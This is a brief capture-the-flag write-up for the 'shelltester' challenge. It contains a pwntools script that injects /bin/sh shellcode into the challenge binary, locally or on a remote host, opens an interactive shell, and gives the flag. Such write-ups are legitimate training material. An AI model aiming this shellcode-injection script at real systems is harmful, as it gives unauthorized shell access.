# shelltester
Solved by **CapangJabba**

## Question
Test your shellcode in my safe program!


## Solution
straight up shellcode injection no bad chars or anything
```
from pwn import *


def con(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug(exe, gdbscript='''
            b 
            c
            ''')
    else:
        return process(exe)


exe = './chal'
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'

payload = asm(shellcraft.sh())

io.sendline(payload)
io.interactive()
```


### Flag
`CSCTF{34sy_Sh3llcod3_w1th_pwnt00ls}`
